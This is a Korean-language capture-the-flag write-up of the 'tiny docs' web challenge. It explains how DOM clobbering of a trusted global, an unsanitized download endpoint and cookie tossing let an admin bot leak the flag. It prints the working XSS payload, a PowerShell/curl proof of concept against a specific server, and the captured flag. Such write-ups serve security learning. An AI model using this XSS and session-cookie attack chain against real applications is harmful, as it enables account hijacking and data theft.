---
title: "[Hypersonic CTF] tiny docs Writeup"
date: 2026-06-09 00:00:00 +0900
categories: [ctf, web]
tags: [writeup, web, xss, dom-clobbering]
ctf_event: "Hypersonic CTF (2026.06.07)"
challenge: "tiny docs"
challenge_category: web
toc: true
comments: false
---

## Flag

```text
HS{0d438c531a572a287482c30c687c1ce47b0ac560}
```

## 문제 요약

`tiny docs`는 사용자가 HTML 형태의 문서를 생성하고, admin bot에게 문서 검토를 요청할 수 있는 서비스다.

문서 보기 페이지(`/doc/:id`)는 DOMPurify로 본문을 sanitize하지만, 다운로드 페이지(`/download/:id`)는 원본 문서 본문인 `doc.raw`를 그대로 export HTML에 붙여 반환한다.

이 차이를 이용해서 admin bot을 `/download/:id`로 이동시키고, raw HTML 안의 script를 실행시켜 flag를 가져올 수 있었다.

## 취약점 분석

문서 생성 시 본문에는 제한이 있지만, `<div>`, `<script>`, `data-range` 등에 필요한 문자들은 모두 허용된다.

```js
const DOCUMENT_BODY_RE = /^[\x00\xfe\xffA-Za-z0-9 '.\-\/;<=>]*$/;
```

문서 보기 페이지에서는 본문을 sanitize한다.

```js
function docPage(id, doc) {
  const clean = sanitizeMarkup(doc.raw);
  ...
  return `...<article id="document">${clean}</article>...`;
}
```

하지만 같은 페이지의 boot script가 `window.docSlot`을 신뢰한다.

```js
var x=window.docSlot;
if(x&&x.dataset&&/^\d{1,8}$/.test(x.dataset.range||'')){
  location.href='/download/${id}?range='+x.dataset.range
}
```

HTML 안에 `id=docSlot`인 요소를 넣으면 DOM clobbering으로 `window.docSlot`이 생긴다. 여기에 `data-range`를 지정하면 admin bot이 자동으로 `/download/:id?range=...`로 이동한다.

다운로드 페이지는 sanitize하지 않은 원본을 그대로 사용한다.

```js
function exportDocument(doc) {
  return EXPORT_PREFIX + doc.raw + EXPORT_SUFFIX;
}
```

또한 `range` 파라미터로 export HTML 앞부분을 잘라낼 수 있다.

```js
const body = exported.slice(start);
send(res, 200, body, {
  "Content-Type": "text/html",
  "Content-Disposition": `filename="{filename}"`.replace('{filename}', filename),
  "Content-Security-Policy": HTML_CSP,
}, "latin1");
```

결과적으로 `/doc/:id`에서는 script가 제거되지만, `docSlot` 리다이렉트를 통해 `/download/:id?range=101`로 이동시키면 raw HTML의 script를 실행할 수 있다.

## Flag 획득 흐름

`/flag`는 admin만 접근 가능하다. admin이 접근하면 admin session의 inbox에 flag가 저장된다.

```js
function flagPage(auth) {
  auth.session.inbox = FLAG;
  return `...<script>fetch('/download/collect',{method:'POST',credentials:'same-origin'}).catch(()=>{})</script>`;
}
```

`/download/collect`는 요청에 여러 `sess` 쿠키가 들어왔을 때, 현재 세션이 아닌 admin 세션의 inbox를 찾아 현재 세션으로 복사한다.

```js
const candidates = getSessionCandidates(req);
const source = candidates.find((item) => item.sid !== auth.sid && item.session.isAdmin && item.session.inbox);
if (!source) {
  send(res, 400, "nothing to collect");
  return;
}
auth.session.inbox = source.session.inbox.slice(0, 256);
```

따라서 admin bot에게 아래 동작을 시키면 된다.

1. 일반 유저로 가입해서 `sess` 값을 확보한다.
2. 문서 본문에 `docSlot`과 raw script를 넣는다.
3. admin review로 `/doc/:id`를 보낸다.
4. `/doc/:id`에서 `docSlot`에 의해 `/download/:id?range=101`로 이동한다.
5. raw script가 `/download` path 전용으로 일반 유저 `sess` 쿠키를 심는다.
6. raw script가 `/flag`로 이동한다.
7. `/flag` 페이지의 fetch가 `/download/collect`를 호출한다.
8. admin 세션과 일반 유저 세션 쿠키가 같이 전송되어 flag가 일반 유저 inbox로 복사된다.
9. `/api/me`에서 flag를 확인한다.

## Payload

```html
<div id=docSlot data-range=101></div><script>document.cookie='sess=USER_SESSION;path=/download';location='/flag'</script>
```

`range=101`은 export prefix와 앞쪽 `docSlot` div 길이를 합친 값이다. 이 offset으로 slice하면 `/download` 응답이 `<script>`부터 시작한다.

## PoC

```powershell
$base = "http://13.209.205.230:23456"
$user = "u" + [guid]::NewGuid().ToString("N").Substring(0,8)
$pass = "p"
$jar = "cookie.txt"

$signup = @{username=$user; password=$pass} | ConvertTo-Json -Compress
Set-Content -LiteralPath signup.json -Value $signup -NoNewline -Encoding ascii
curl.exe -sS -c $jar -H "Content-Type: application/json" --data-binary "@signup.json" "$base/api/signup"

$sid = (Get-Content $jar |
  Where-Object { $p = $_ -split "`t"; $p.Length -ge 7 -and $p[5] -eq "sess" } |
  Select-Object -Last 1).Split("`t")[6]

$raw = "<div id=docSlot data-range=101></div><script>document.cookie='sess=$sid;path=/download';location='/flag'</script>"
$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($raw))

$docReq = @{title="x"; filename="x.html"; body_b64=$b64} | ConvertTo-Json -Compress
Set-Content -LiteralPath doc.json -Value $docReq -NoNewline -Encoding ascii
$doc = curl.exe -sS -b $jar -c $jar -H "Content-Type: application/json" --data-binary "@doc.json" "$base/api/documents" | ConvertFrom-Json

$reportReq = @{url=$doc.path} | ConvertTo-Json -Compress
Set-Content -LiteralPath report.json -Value $reportReq -NoNewline -Encoding ascii
curl.exe -sS -H "Content-Type: application/json" --data-binary "@report.json" "$base/report"

Start-Sleep -Seconds 1
curl.exe -sS -b $jar "$base/api/me"
```

## 결과

```json
{
  "username": "ue2ee7030",
  "inbox": "HS{0d438c531a572a287482c30c687c1ce47b0ac560}"
}
```
